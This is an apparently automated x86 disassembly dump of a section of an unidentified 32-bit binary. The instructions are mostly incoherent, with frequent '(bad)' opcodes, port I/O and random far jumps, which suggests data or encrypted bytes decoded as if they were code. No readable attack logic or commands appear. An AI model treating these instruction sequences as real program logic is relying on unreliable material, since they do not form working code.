  413ed0:	jae    0x413f3b
  413ed2:	inc    edx
  413ed3:	jae    0x413f3a
  413ed5:	popa   
  413ed6:	push   ecx
  413ed7:	pop    eax
  413ed8:	pop    ecx
  413ed9:	outs   dx,BYTE PTR ds:[esi]
  413eda:	jbe    0x413f54
  413edc:	jns    0x413f32
  413ede:	push   ecx
  413edf:	imul   ebp,DWORD PTR [ebx+0x74],0x61
  413ee3:	jns    0x413f34
  413ee5:	inc    ebx
  413ee6:	jo     0x413f5a
  413ee8:	data16 jp 0x413f3d
  413eeb:	jp     0x413f45
  413eed:	ins    BYTE PTR es:[edi],dx
  413eee:	je     0x413f5f
  413ef0:	jns    0x413f60
  413ef2:	popa   
  413ef3:	push   esi
  413ef4:	push   ebp
  413ef5:	push   0x0
	...
  413f0a:	popa   
  413f0b:	push   edi
  413f0c:	push   esi
  413f0d:	push   esp
  413f0e:	dec    eax
  413f0f:	je     0x413f5d
  413f11:	push   ebx
  413f12:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413f16:	push   esp
  413f17:	arpl   WORD PTR [ecx+0x4b],cx
  413f1a:	inc    edi
  413f1b:	jne    0x413f63
  413f1d:	push   ebx
  413f1e:	outs   dx,DWORD PTR ds:[esi]
  413f1f:	push   ebx
  413f20:	inc    esi
  413f21:	inc    edi
  413f22:	push   0x66495949
  413f27:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413f2b:	push   esi
  413f2c:	jb     0x413f96
  413f2e:	add    BYTE PTR [eax],al
  413f30:	js     0x413fa6
  413f32:	popa   
  413f33:	inc    ebx
  413f34:	push   ecx
  413f35:	ins    BYTE PTR es:[edi],dx
  413f36:	pop    eax
  413f37:	ja     0x413f86
  413f39:	je     0x413fb1
  413f3b:	add    BYTE PTR [ebp+0x7a],dl
  413f3e:	ins    BYTE PTR es:[edi],dx
  413f3f:	jb     0x413fba
  413f41:	inc    edi
  413f42:	push   edi
  413f43:	push   esi
  413f44:	inc    edi
  413f45:	ins    BYTE PTR es:[edi],dx
  413f46:	add    BYTE PTR [eax],al
  413f48:	jbe    0x413f8e
  413f4a:	push   esi
  413f4b:	push   edi
  413f4c:	dec    edx
  413f4d:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413f54:	add    BYTE PTR [eax],al
  413f56:	in     al,0xf5
  413f58:	jnp    0x413fa8
  413f5a:	jnp    0x413f2a
  413f5c:	cmc    
  413f5d:	call   FWORD PTR [ebx+0x61]
  413f60:	and    bh,dl
  413f62:	sbb    al,0x88
  413f64:	pushf  
  413f65:	mov    esp,0xd767
  413f6a:	add    BYTE PTR [ecx],al
  413f6c:	add    BYTE PTR [eax],al
  413f6e:	add    ah,BYTE PTR [eax+0x54935b6d]
  413f74:	cdq    
  413f75:	and    BYTE PTR [ecx],dl
  413f77:	rcr    DWORD PTR [eax],0x30
  413f7a:	es hlt 
  413f7c:	imul   edx,DWORD PTR [ecx+eiz*8],0xffffffaa
  413f80:	xchg   ebp,eax
  413f81:	mov    ds:0xea1f07f0,eax
  413f86:	xchg   DWORD PTR [di-0x2a],esi
  413f8a:	int3   
  413f8b:	mov    cl,0x38
  413f8d:	lock ret 
  413f8f:	(bad)  
  413f91:	cmp    bh,bh
  413f93:	mov    edi,0x42b5df1f
  413f98:	jle    0x413f8a
  413f9a:	fadd   DWORD PTR [esi-0x38]
  413f9d:	(bad)  
  413f9e:	out    dx,al
  413f9f:	mov    gs,esp
  413fa1:	sub    BYTE PTR [edi],ah
  413fa3:	loope  0x413f2e
  413fa5:	dec    eax
  413fa6:	mov    DWORD PTR [edi+0x4d8a008b],ebx
  413fac:	ficomp DWORD PTR [esi-0x23400d5e]
  413fb2:	xchg   esi,eax
  413fb3:	inc    ebx
  413fb4:	test   eax,0xe54fae31
  413fb9:	rol    DWORD PTR [ebx+0x42f97e0b],1
  413fbf:	stos   DWORD PTR es:[edi],eax
  413fc0:	jo     0x413f7f
  413fc2:	fsubr  QWORD PTR [ecx]
  413fc4:	jb     0x414025
  413fc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fc7:	sbb    BYTE PTR [edi-0x4b6107a9],0x65
  413fce:	mov    eax,ds:0xd09898fc
  413fd3:	ja     0x413f8d
  413fd5:	inc    edi
  413fd6:	fisub  DWORD PTR ds:0x84313794
  413fdc:	sbb    esi,esi
  413fde:	iret   
  413fdf:	sub    al,0x2d
  413fe1:	and    al,0x82
  413fe3:	(bad)  
  413fe4:	or     eax,0x8d11c6fe
  413fe9:	xchg   edi,eax
  413fea:	jmp    0x2dc1:0x5c2bc092
  413ff1:	(bad)  
  413ff4:	retf   0x7fbd
  413ff7:	mov    ds:0xace9b240,eax
  413ffc:	loope  0x413faf
  413ffe:	retf   0x4d5e
  414001:	jns    0x41404e
  414003:	mov    ebp,0x168f8f64
  414008:	fs cmp ecx,edi
  41400b:	or     ebp,esp
  41400d:	or     dh,ch
  41400f:	(bad)  
  414010:	(bad)  
  414011:	out    0x82,eax
  414013:	sar    BYTE PTR [edi-0x2d],cl
  414016:	jmp    0x8c55:0x1e840ece
  41401d:	test   BYTE PTR [eax-0x1fd07305],cl
  414023:	shr    BYTE PTR [ebp+0x11f45975],1
  414029:	arpl   WORD PTR [ebx+0x66],bp
  41402c:	inc    ecx
  41402d:	and    eax,0xb28acf70
  414032:	les    edi,FWORD PTR [edx+0x6607ca3b]
  414038:	inc    ebx
  414039:	jmp    0xbd9b:0x3c2b2119
  414040:	call   0xc542b90b
  414045:	loope  0x41409b
  414047:	mov    edx,0x524b6664
  41404c:	out    dx,al
  41404d:	iret   
  41404e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41404f:	mov    WORD PTR [esi-0x5e],?
  414052:	aad    0xf4
  414054:	jb     0x41407b
  414056:	std    
  414057:	outs   dx,DWORD PTR ds:[esi]
  414058:	cmp    DWORD PTR [ecx-0x2b784bb0],ebp
  41405e:	imul   ebp,DWORD PTR ds:[ecx-0x4f],0x434a7463
  414066:	scas   eax,DWORD PTR es:[edi]
  414067:	sub    ch,BYTE PTR [ecx+edx*1+0x79]
  41406b:	dec    ebp
  41406c:	or     al,0x8a
	...
  4140d6:	pop    edx
  4140d7:	ficom  DWORD PTR [esi+0x60]
  4140da:	(bad)  
  4140db:	in     al,dx
  4140dc:	jle    0x4140d8
  4140de:	call   0x8133:0x3cd52e96
  4140e5:	lahf   
  4140e6:	fadd   DWORD PTR [bx+si]
  4140e9:	add    BYTE PTR [eax],al
  4140eb:	add    DWORD PTR [eax],eax
  4140ed:	add    bl,dl
  4140ef:	inc    edi
  4140f0:	aad    0xf
  4140f2:	jns    0x41416b
  4140f4:	inc    ebx
  4140f5:	xchg   edi,eax
  4140f6:	addr16 int 0x34
  4140f9:	jne    0x4140f5
  4140fb:	ds inc ecx
  4140fd:	mov    edx,0x73ddab44
  414102:	xor    esp,DWORD PTR gs:[eax-0x24]
  414106:	out    0xe3,eax
  414108:	xchg   BYTE PTR [di-0x48],cl
  41410c:	fld    TBYTE PTR [edx]
  41410e:	add    DWORD PTR [ecx+0x24744ca3],0xffffffe4
  414115:	cmp    al,0xc1
  414117:	inc    edi
  414118:	dec    ebp
  414119:	push   0xffffff93
  41411b:	aaa    
  41411c:	aas    
  41411d:	jp     0x414153
  41411f:	pop    edx
  414120:	inc    esp
  414121:	sub    al,0xca
  414123:	dec    ebp
  414124:	push   cs
  414125:	cmp    eax,0xfb4c8ceb
  41412a:	mov    eax,ds:0x3b318a56
  41412f:	enter  0x8474,0x7c
  414133:	out    0xe7,eax
  414135:	leave  
  414136:	and    bl,0x9f
  414139:	and    BYTE PTR [ebp+0x146648d1],al
  41413f:	aaa    
  414140:	rol    BYTE PTR cs:[edi-0x6afd5f71],1
  414147:	loop   0x414124
  414149:	mov    esp,0x5e1cabc6
  41414e:	cdq    
  41414f:	sub    al,0x1f
  414151:	call   0x375e84f
  414156:	xchg   esi,eax
  414157:	dec    ecx
  414158:	iret   
  414159:	jl     0x414125
  41415b:	push   eax
  41415c:	push   es
  41415d:	fstp   TBYTE PTR [edx+0x79f15c03]
  414163:	or     BYTE PTR [ebx+0x7a07f796],0xcb
  41416a:	test   BYTE PTR [esi-0x64],dh
  41416d:	ret    0x5d90
  414170:	jge    0x4140fa
  414172:	shr    ebp,1
  414174:	out    dx,al
  414175:	(bad)  
  414176:	ins    BYTE PTR es:[edi],dx
  414177:	pop    edi
  414178:	fld    st(6)
  41417a:	call   0x6818bcae
  41417f:	inc    esi
  414180:	fdiv   DWORD PTR [edi+0x300b3196]
  414186:	push   eax
  414187:	cmp    eax,0x75064801
  41418c:	sub    eax,0xa2e492b8
  414191:	psrlw  mm7,QWORD PTR [edi-0x43f2bcc4]
  414198:	fnsave [ecx+esi*1]
  41419b:	leave  
  41419c:	rcl    DWORD PTR [ebx+edi*1+0x26a95fe],0x72
  4141a4:	push   0x46
  4141a6:	scas   al,BYTE PTR es:[edi]
  4141a7:	clc    
  4141a8:	xor    DWORD PTR [edx],edi
  4141aa:	repz out dx,eax
  4141ac:	push   ds
  4141ad:	jmp    0x41413c
  4141af:	push   ebx
  4141b0:	inc    eax
  4141b1:	push   es
  4141b2:	push   eax
  4141b3:	repnz sbb al,BYTE PTR [ecx]
  4141b6:	pop    ebx
  4141b7:	jns    0x41418f
  4141b9:	xor    eax,0xa758b8bc
  4141be:	mov    ecx,0x6c0a7e11
  4141c3:	std    
  4141c4:	int3   
  4141c5:	shl    DWORD PTR [eax+eiz*4],cl
  4141c8:	mov    bh,0xab
  4141ca:	jbe    0x41423b
  4141cc:	(bad)  
  4141cd:	out    0xb2,al
  4141cf:	xchg   ecx,eax
  4141d0:	mov    al,ds:0x72ce37e9
  4141d5:	adc    DWORD PTR [ebp-0x75057e46],ecx
  4141db:	pop    es
  4141dc:	movhps xmm5,QWORD PTR [edx-0x42077e7e]
  4141e3:	imul   esi,DWORD PTR [esi-0x23],0xffffffee
  4141e7:	into   
  4141e8:	mov    edx,0x6beb0270
  4141ed:	sahf   
	...
  414256:	add    dl,BYTE PTR [edx]
  414258:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  41425e:	mov    DWORD PTR [ecx+0x37],edx
  414261:	push   edi
  414262:	int3   
  414263:	xchg   ebp,eax
  414264:	es or  eax,0xd967
  41426a:	add    BYTE PTR [ecx],al
  41426c:	add    BYTE PTR [eax],al
  41426e:	mov    edx,gs
  414270:	call   0x597d0a72
  414275:	fcom   QWORD PTR [esi+0x7c]
  414278:	pusha  
  414279:	into   
  41427a:	push   ds
  41427b:	mov    edx,0x3c0033b
  414280:	mov    eax,0x212e1394
  414285:	sub    edi,DWORD PTR [ebx+0x2a5cc3c]
  41428b:	sbb    eax,0x6ccd0cac
  414290:	mov    DWORD PTR [edx+edx*2],ecx
  414293:	leave  
  414294:	js     0x414217
  414296:	xchg   ebx,eax
  414297:	mov    ebx,0x40b828ea
  41429c:	push   ss
  41429d:	out    0x60,al
  41429f:	lods   al,BYTE PTR ds:[esi]
  4142a0:	in     al,0x77
  4142a2:	out    0xf1,al
  4142a4:	jne    0x41427a
  4142a6:	js     0x4142f2
  4142a8:	push   0xa589b2b7
  4142ad:	cmp    DWORD PTR [esi+0x17],edi
  4142b0:	adc    ecx,ebx
  4142b2:	mov    al,ds:0x56234637
  4142b7:	push   0x1b
  4142b9:	dec    edi
  4142ba:	fs repnz pop esp
  4142bd:	xor    eax,0xbe8af3a4
  4142c2:	xchg   bh,ah
  4142c4:	repz or BYTE PTR [esi-0x7a49f07f],bl
  4142cb:	push   esi
  4142cc:	aaa    
  4142cd:	inc    esp
  4142ce:	lahf   
  4142cf:	pushf  
  4142d0:	xchg   esi,eax
  4142d1:	dec    ecx
  4142d2:	and    bl,BYTE PTR [ebp+0x40599d2e]
  4142d8:	fild   QWORD PTR ds:0x97446419
  4142de:	jmp    0xd977:0xd9fcdd4b
  4142e5:	in     eax,dx
  4142e6:	not    BYTE PTR ds:0x83d422fc
  4142ec:	loop   0x41427b
  4142ee:	pop    ds
  4142ef:	loop   0x41429e
  4142f1:	sub    al,0x4e
  4142f3:	sahf   
  4142f4:	inc    esi
  4142f5:	pop    ebp
  4142f6:	lods   al,BYTE PTR ds:[esi]
  4142f8:	dec    esi
  4142f9:	push   ecx
  4142fa:	das    
  4142fb:	mov    esp,0x884a0903
  414300:	mov    edx,0x8bb00886
  414305:	xchg   esp,eax
  414306:	ins    DWORD PTR es:[edi],dx
  414307:	sub    ch,BYTE PTR [eax+0x1189c071]
  41430d:	mov    ecx,0xe1ca0c28
  414312:	leave  
  414313:	sub    dl,cl
  414315:	aaa    
  414316:	outs   dx,BYTE PTR ds:[esi]
  414317:	aad    0x1
  414319:	add    edx,ebp
  41431b:	(bad)  
  41431c:	int3   
  41431d:	ins    BYTE PTR es:[edi],dx
  41431e:	mov    esp,0xe311e7e
  414323:	jge    0x414379
  414325:	int    0x27
  414327:	xchg   esi,eax
  414328:	cwde   
  414329:	mov    ecx,0xc3141b8a
  41432e:	js     0x414395
  414330:	push   edi
  414331:	das    
  414332:	(bad)  
  414333:	sbb    bl,bh
  414335:	outs   dx,BYTE PTR ds:[esi]
  414336:	sub    eax,0x3693b2af
  41433b:	add    BYTE PTR [edx],dl
  41433d:	sbb    DWORD PTR [edi-0x3626adbb],0x23a98ea7
  414347:	sar    BYTE PTR [eax-0x425fe43a],cl
  41434d:	arpl   WORD PTR [edi],bx
  41434f:	test   al,0xbd
  414351:	mov    ds:0xf7a15c6e,al
  414356:	push   0x3e
  414358:	xchg   DWORD PTR [edx+0x1e],ebx
  41435b:	test   BYTE PTR [esi],al
  41435d:	push   ebp
  41435e:	and    eax,0x66984b1f
  414363:	sti    
  414364:	push   0xf7adeeb8
  414369:	mov    esp,ecx
  41436b:	and    cl,BYTE PTR [ebp+0x30]
	...
  4143d6:	add    DWORD PTR [ecx-0x2122293],eax
  4143dc:	mov    cl,0xdd
  4143de:	rol    DWORD PTR [ebp+0x5e],0xa1
  4143e2:	in     eax,0x3f
  4143e4:	mov    ch,0xf4
  4143e6:	fiadd  DWORD PTR [bx+si]
  4143e9:	add    BYTE PTR [eax],al
  4143eb:	add    DWORD PTR [eax],eax
  4143ed:	add    BYTE PTR [ecx-0x57ade685],ah
  4143f3:	xchg   edx,eax
  4143f4:	add    eax,0xfad7f962
  4143f9:	data16 xor ch,ah
  4143fc:	clc    
  4143fd:	cmp    edx,0x50
  414400:	imul   eax,DWORD PTR [esi-0x7d],0x7f208d9e
  414407:	loope  0x4143ea
  414409:	and    eax,0x6e35dc5a
  41440e:	xor    BYTE PTR [esi-0x2c3953ef],ah
  414414:	int3   
  414415:	jno    0x4143d7
  414417:	xchg   esp,eax
  414418:	leave  
  414419:	adc    DWORD PTR [ebx+0x5e],0xb6967476
  414420:	int3   
  414421:	mov    ebp,esi
  414423:	jb     0x41445f
  414425:	or     BYTE PTR [edi+0x3d],dl
  414428:	popa   
  414429:	add    BYTE PTR [edi+edx*2+0x40340efa],0xc3
  414431:	ds ins DWORD PTR es:[edi],dx
  414433:	adc    eax,0xb5e44199
  414438:	xor    al,0x0
  41443a:	inc    eax
  41443b:	rcr    DWORD PTR [ebx+0x48],cl
  41443e:	and    eax,ebp
  414440:	nop
  414441:	pop    edi
  414442:	call   0xb162b976
  414447:	cld    
  414448:	pop    eax
  414449:	pop    esi
  41444a:	sub    al,0xed
  41444c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41444d:	fwait
  41444e:	or     DWORD PTR [edx+edx*4+0x55085ca3],edi
  414455:	jo     0x41441d
  414457:	sub    cl,BYTE PTR [edi-0x58]
  41445a:	mov    al,0x25
  41445c:	das    
  41445d:	mov    ds:0x3eff8050,eax
  414462:	pop    es
  414463:	sbb    ecx,DWORD PTR es:[ecx+0x2d]
  414467:	loope  0x4144ba
  414469:	pop    ebp
  41446a:	clc    
  41446b:	stos   BYTE PTR es:[edi],al
  41446c:	jecxz  0x4144e5
  41446e:	xchg   bl,cl
  414470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414471:	sbb    al,0x68
  414473:	or     eax,0x57cb48b0
  414478:	repnz cdq 
  41447a:	dec    ecx
  41447b:	push   esp
  41447c:	jecxz  0x4144f2
  41447e:	push   ss
  41447f:	jb     0x414403
  414481:	sbb    BYTE PTR [esi-0x63],bh
  414484:	push   ds
  414485:	rcr    BYTE PTR [ecx*4-0x49e50165],cl
  41448c:	mov    ds,WORD PTR [edi]
  41448e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41448f:	cmp    BYTE PTR ds:0x2759423c,dl
  414495:	inc    edi
  414496:	cmp    DWORD PTR [ebp+0x43e8ab41],eax
  41449c:	imul   edx,DWORD PTR [ecx-0x10ca5d7],0xffffffb8
  4144a3:	and    al,0x7f
  4144a5:	jnp    0x4144b9
  4144a7:	or     eax,0x72390117
  4144ac:	shl    DWORD PTR [edx-0x23],1
  4144af:	mov    BYTE PTR [edx],dh
  4144b1:	jne    0x414493
  4144b3:	xor    eax,0x6d703596
  4144b8:	xchg   BYTE PTR [edi+ebp*1-0xa],cl
  4144bc:	je     0x414451
  4144be:	inc    ebp
  4144bf:	pusha  
  4144c0:	xchg   ecx,eax
  4144c1:	loopne 0x4144c4
  4144c3:	inc    ebp
  4144c4:	pop    ds
  4144c5:	leave  
  4144c6:	cwde   
  4144c7:	mov    ah,0x8f
  4144c9:	push   ecx
  4144ca:	xor    BYTE PTR [edi+edi*8+0x32bd1183],cl
  4144d1:	or     BYTE PTR [edx],dh
  4144d3:	in     al,dx
  4144d4:	call   FWORD PTR [edx+0x61]
  4144d7:	mov    ah,0x87
  4144d9:	or     BYTE PTR [ebx],dl
  4144db:	imul   esi,DWORD PTR [edi-0x61],0x3
  4144df:	aaa    
  4144e0:	outs   dx,DWORD PTR ds:[esi]
  4144e1:	sbb    eax,0xb64db982
  4144e6:	xchg   esi,eax
  4144e7:	sub    esp,DWORD PTR [edi]
  4144e9:	mov    al,0x2c
  4144eb:	mov    ds:0xab01,eax
	...
  414554:	add    BYTE PTR [eax],al
  414556:	pop    ebx
  414557:	jae    0x41459b
  414559:	or     eax,0x775f3d6a
  41455e:	pop    ds
  41455f:	dec    edi
  414560:	or     cl,BYTE PTR [esi-0x19]
  414563:	int3   
  414564:	pop    esi
  414565:	and    eax,0xdb67
  41456a:	add    BYTE PTR [ecx],al
  41456c:	add    BYTE PTR [eax],al
  41456e:	cwde   
  41456f:	repnz dec edx
  414571:	sub    BYTE PTR [ebx-0x5a868756],al
  414577:	dec    edi
  414578:	xor    ebx,eax
  41457a:	test   ebx,ecx
  41457c:	cld    
  41457d:	in     eax,0xea
  41457f:	mov    dl,BYTE PTR [edi-0xd]
  414582:	(bad)  
  414583:	dec    esi
  414584:	cmp    DWORD PTR [eax],edx
  414586:	push   ecx
  414587:	aam    0x86
  414589:	(bad)  
  41458a:	fs mov bh,0x3a
  41458d:	mov    edx,0x10dcc14b
  414592:	(bad)  
  414593:	jno    0x414590
  414595:	stos   BYTE PTR es:[edi],al
  414596:	push   0xfffffff9
  414598:	icebp  
  414599:	mov    dl,0x86
  41459b:	jmp    0x3a8c:0x5a057383
  4145a2:	lods   al,BYTE PTR ds:[esi]
  4145a3:	(bad)
  4145a7:	mov    bl,0x23
  4145a9:	mov    WORD PTR [ebx+0x49],?
  4145ac:	inc    edx
  4145ad:	lods   al,BYTE PTR ds:[esi]
  4145ae:	jne    0x414572
  4145b0:	push   ds
  4145b1:	xchg   ecx,eax
  4145b2:	add    eax,0xac741f8d
  4145b7:	xchg   ebx,eax
  4145b8:	adc    eax,0xdf7f037
  4145bd:	ficom  WORD PTR [eax-0x62]
  4145c0:	aam    0x2f
  4145c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145c3:	addr16 pusha 
  4145c5:	cmc    
  4145c6:	or     eax,0x82da95d
  4145cb:	push   ecx
  4145cc:	add    al,0x69
  4145ce:	dec    ebp
  4145cf:	dec    edi
  4145d0:	and    bl,BYTE PTR [ecx-0xc]
  4145d3:	(bad)  ds:0x146828a5
  4145d9:	or     eax,0x78a07d8a
  4145de:	ins    BYTE PTR es:[edi],dx
  4145df:	fmulp  st(4),st
  4145e1:	sbb    al,0x1d
  4145e3:	hlt    
  4145e4:	inc    ecx
  4145e5:	xor    DWORD PTR [ebp-0x5],ebx
  4145e8:	(bad)  
  4145e9:	mov    al,0x57
  4145eb:	and    ebx,DWORD PTR [ebp-0x6c8c1d0c]
  4145f1:	sub    ch,dh
  4145f3:	or     DWORD PTR [edi-0x6],eax
  4145f6:	mov    al,0x2a
  4145f8:	xchg   esi,eax
  4145f9:	jp     0x414641
  4145fb:	ss scas al,BYTE PTR es:[edi]
  4145fd:	cmp    eax,0x5b3a3561
  414602:	add    al,0x40
  414604:	or     ebx,edx
  414606:	sahf   
  414607:	add    eax,0x428e53e1
  41460c:	enter  0x8afd,0xf9
  414610:	mov    al,0x47
  414612:	fisub  DWORD PTR ds:0x78c68864
  414618:	es xchg esp,eax
  41461a:	out    dx,eax
  41461b:	dec    eax
  41461c:	push   cs
  41461d:	push   esp
  41461e:	add    dh,BYTE PTR [ecx+0x18139722]
  414624:	xor    eax,0xf9e5b7f1
  414629:	cmc    
  41462a:	into   
  41462b:	lods   eax,DWORD PTR ds:[esi]
  41462c:	fcom   DWORD PTR [edx+0x4a72abd0]
  414632:	sbb    al,0x13
  414634:	jae    0x4145c9
  414636:	test   BYTE PTR [edx+eiz*4],al
  414639:	adc    DWORD PTR [esi-0x61f50127],esp
  41463f:	or     al,0xa5
  414641:	jmp    0x2b1eb51a
  414646:	jae    0x4145dc
  414648:	add    DWORD PTR [edx],edi
  41464a:	jmp    0x7f04:0xb0b80c81
  414651:	nop
  414652:	ss sub al,ch
  414655:	fadd   DWORD PTR [esi+0x3]
  414658:	call   0x7990b582
  41465d:	cli    
  41465e:	add    al,0x2f
  414660:	inc    esi
  414661:	xchg   ebp,eax
  414662:	fnstcw WORD PTR [ebx-0x22]
  414665:	(bad)  
  414666:	mov    edx,0x824ed6dd
  41466b:	inc    edi
  41466c:	adc    DWORD PTR [edx+0x0],0x0
	...
  4146d4:	add    BYTE PTR [eax],al
  4146d6:	jg     0x414736
  4146d8:	cmc    
  4146d9:	ins    DWORD PTR es:[edi],dx
  4146da:	cmc    
  4146db:	out    dx,eax
  4146dc:	call   FWORD PTR [esi+0x17]
  4146df:	enter  0xab7a,0xb1
  4146e3:	pop    edx
  4146e4:	repz call 0x100:0xdc67
  4146ec:	add    BYTE PTR [eax],al
  4146ee:	add    DWORD PTR [esi+0x4b],ebp
  4146f1:	or     BYTE PTR [ecx+eax*4+0x52],bh
  4146f5:	daa    
  4146f6:	repnz rcr esp,0xc1
  4146fa:	xor    DWORD PTR [ebx],esi
  4146fc:	shr    bl,0x99
  4146ff:	lds    edi,FWORD PTR [edx+ebp*1+0xdc98166]
  414706:	outs   dx,DWORD PTR ds:[esi]
  414707:	(bad)  
  414709:	pop    ss
  41470a:	stos   DWORD PTR es:[edi],eax
  41470b:	pop    edx
  41470c:	mov    ah,0x80
  41470e:	stos   BYTE PTR es:[edi],al
  41470f:	(bad)  
  414710:	loopne 0x4146b7
  414712:	ret    
  414713:	xchg   esp,eax
  414714:	(bad)  
  414715:	mov    al,ds:0x61e1cb2b
  41471a:	push   es
  41471b:	in     eax,0xd4
  41471d:	leave  
  41471e:	(bad)  
  41471f:	xchg   ebp,eax
  414720:	push   esp
  414721:	bound  ebp,QWORD PTR [esi+0x47]
  414724:	xchg   edi,eax
  414725:	aad    0xc2
  414727:	lea    esp,[eax-0x25a8b1dd]
  41472d:	jecxz  0x41470e
  41472f:	jbe    0x414718
  414731:	mov    ch,0x9e
  414733:	mov    edi,0x672563f7
  414738:	jns    0x414763
  41473a:	jge    0x414721
  41473c:	pop    edi
  41473d:	ror    BYTE PTR [edi+0x4f],1
  414740:	pop    ebp
  414741:	inc    edi
  414742:	out    dx,al
  414743:	mov    al,ds:0x12535d7e
  414748:	cvtps2pi mm6,QWORD PTR ds:0x2089d481
  41474f:	std    
  414750:	mov    bh,0x7
  414752:	sbb    DWORD PTR [ebx+0x1f54692e],0xba67b8f1
  41475c:	jle    0x41477a
  41475e:	mov    esp,0xdba93e39
  414763:	xor    BYTE PTR [ecx],ch
  414765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414766:	leave  
  414767:	add    ecx,DWORD PTR [eax]
  414769:	aad    0x4
  41476b:	xchg   edx,eax
  41476c:	push   0xd73649e1
  414771:	dec    esi
  414772:	repnz ins DWORD PTR es:[edi],dx
  414774:	inc    ebp
  414775:	seto   BYTE PTR [ecx+0x4c064da5]
  41477c:	in     al,dx
  41477d:	clc    
  41477e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41477f:	ds mov ebx,0xc9249f1d
  414785:	les    esi,FWORD PTR [esi+0x2d189c6a]
  41478b:	cli    
  41478c:	jmp    0x1ef4fbcf
  414791:	lea    ecx,[edx]
  414793:	pop    esp
  414794:	mov    al,ds:0x83b466c8
  414799:	sahf   
  41479a:	out    dx,eax
  41479b:	mov    esi,0xef361401
  4147a0:	xchg   BYTE PTR [edx],dh
  4147a2:	pop    ebp
  4147a3:	mov    ?,WORD PTR [ebx]
  4147a5:	pop    esi
  4147a6:	sub    DWORD PTR [ecx],ebx
  4147a8:	jae    0x4147af
  4147aa:	dec    esp
  4147ab:	adc    al,0x8f
  4147ad:	fwait
  4147ae:	xchg   ebx,eax
  4147af:	jp     0x41475d
  4147b1:	sbb    BYTE PTR [ecx],bl
  4147b3:	jp     0x414829
  4147b5:	pop    ss
  4147b6:	sub    esi,ebp
  4147b8:	out    0x2a,al
  4147ba:	xchg   edi,edx
  4147bc:	fld    TBYTE PTR [esi]
  4147be:	scas   eax,DWORD PTR es:[edi]
  4147bf:	fucomip st,st(0)
  4147c1:	fidiv  DWORD PTR es:[ecx+ebx*4-0x242d60b2]
  4147c9:	loop   0x414756
  4147cb:	xchg   ebx,eax
  4147cc:	mov    BYTE PTR [edx+eiz*1+0x1],dl
  4147d0:	shl    DWORD PTR [edx+0x6a],cl
  4147d3:	rcl    BYTE PTR [ebx+0x13c2ab65],0x1f
  4147da:	add    DWORD PTR [ebp+eax*4-0x77],0xbcfe8b71
  4147e2:	push   eax
  4147e3:	dec    esp
  4147e4:	or     DWORD PTR [ecx-0x5b62e52a],eax
  4147ea:	push   ecx
  4147eb:	out    0xa1,eax
  4147ed:	fild   DWORD PTR [eax]
	...
  414853:	add    BYTE PTR [eax],al
  414855:	add    BYTE PTR [esi+0x2f],bh
  414858:	add    DWORD PTR [ebp+0x51],ebp
  41485b:	outs   dx,DWORD PTR ds:[esi]
  41485c:	jle    0x41489d
  41485e:	aas    
  41485f:	mov    BYTE PTR [esi],cl
  414861:	cmp    eax,0x79ab65b5
  414866:	fld    QWORD PTR [bx+si]
  414869:	add    BYTE PTR [eax],al
  41486b:	add    DWORD PTR [eax],eax
  41486d:	add    BYTE PTR [esi-0x4042ed69],ah
  414873:	cld    
  414874:	call   FWORD PTR [esi]
  414876:	and    al,0x4b
  414878:	jp     0x414885
  41487a:	inc    esi
  41487b:	loopne 0x41480d
  41487d:	add    eax,0xa3799ce
  414882:	xchg   esp,eax
  414883:	pop    edx
  414884:	sub    ebp,DWORD PTR [edx+0x47]
  414887:	adc    esi,ebx
  414889:	pop    ss
  41488a:	aad    0xf3
  41488c:	sar    BYTE PTR [eax+eax*4-0x26],1
  414890:	push   ebx
  414891:	pop    ecx
  414892:	test   BYTE PTR [edx],al
  414894:	mov    al,0xd
  414896:	xchg   edx,eax
  414897:	jbe    0x414842
  414899:	dec    esp
  41489a:	mov    esp,0x2c7d2312
  41489f:	adc    eax,0x3d462b9f
  4148a4:	fisttp QWORD PTR [esi]
  4148a6:	out    0xa4,eax
  4148a8:	in     eax,0x39
  4148aa:	and    bh,BYTE PTR [eax]
  4148ac:	hlt    
  4148ad:	pop    ds
  4148ae:	imul   ecx,DWORD PTR [esi-0x70],0x1b
  4148b2:	imul   esi,edi,0x3a57120a
  4148b8:	retf   
  4148b9:	inc    edx
  4148ba:	mov    ds:0xb6be9fe3,al
  4148bf:	jmp    0x414920
  4148c1:	fldcw  WORD PTR [ecx+edi*8]
  4148c4:	pop    ss
  4148c5:	scas   al,BYTE PTR es:[edi]
  4148c6:	(bad)  
  4148c7:	ret    
  4148c8:	mov    ds,WORD PTR [eax+0x9]
  4148cb:	mov    ch,0xfc
  4148cd:	mov    esp,DWORD PTR ds:[edi-0x47]
  4148d1:	mov    al,0xf7
  4148d3:	jmp    FWORD PTR [edx+0x15]
  4148d6:	(bad)
  4148d9:	and    BYTE PTR [edi-0x5f],bh
  4148dc:	jnp    0x4148aa
  4148de:	sub    al,0xd4
  4148e0:	scas   al,BYTE PTR es:[edi]
  4148e1:	and    eax,0xcf367133
  4148e6:	add    BYTE PTR [edx-0x7b],cl
  4148e9:	out    dx,al
  4148ea:	sbb    esi,esi
  4148ec:	daa    
  4148ed:	in     eax,dx
  4148ee:	(bad)  
  4148ef:	adc    al,0x56
  4148f1:	mov    ds:0xbeb21a25,eax
  4148f6:	xor    BYTE PTR [edx-0xde48035],al
  4148fc:	sub    ch,BYTE PTR ds:0x3fed2037
  414902:	ins    BYTE PTR es:[edi],dx
  414903:	pop    ss
  414904:	test   DWORD PTR [ecx-0x46],edi
  414907:	push   edx
  414908:	int    0x75
  41490a:	jecxz  0x41497c
  41490c:	or     BYTE PTR [ecx+0x52],ah
  41490f:	add    DWORD PTR [ebx],ebx
  414911:	cmp    eax,0x5778017e
  414916:	ins    BYTE PTR es:[edi],dx
  414917:	adc    DWORD PTR [edx+0x5b],ecx
